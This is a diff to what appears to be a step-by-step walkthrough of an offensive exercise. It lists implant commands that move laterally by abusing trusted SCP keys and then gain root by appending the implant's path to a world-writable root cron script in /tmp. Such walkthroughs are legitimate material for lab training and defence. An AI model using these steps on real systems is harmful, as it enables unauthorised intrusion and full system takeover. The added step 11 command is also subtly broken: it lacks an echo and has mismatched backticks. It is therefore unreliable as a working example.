@@ -14,4 +14,4 @@ Commands used:\
 8. Upload that implant to his desktop with the upload command (More blendy than another SCP): `upload ./[Pivot Implant Name in Local Directory] ./[Pivot Implant Name in Remote Directory]`
 9. Use our implant to scp it over to the Final Server: `execute -o scp [Pivot Implant Name] aeverwooddesktop@[IP of Final Server]:/home/aeverwooddesktop/Documents` (His desktop is trusted because of the scp keys so there is no need for a password)`
 10. Navigate to the tmp directory and see what is in one of the root_cron_job files: `execute -o cat root_cron_job_1.sh`
-11. 
+11. Append our file path to one of the cron job scripts in order to privilage escalate: `execute -o "/home/aeverwood/Documents/uhoh" >> /tmp/root_cron_job_1.sh
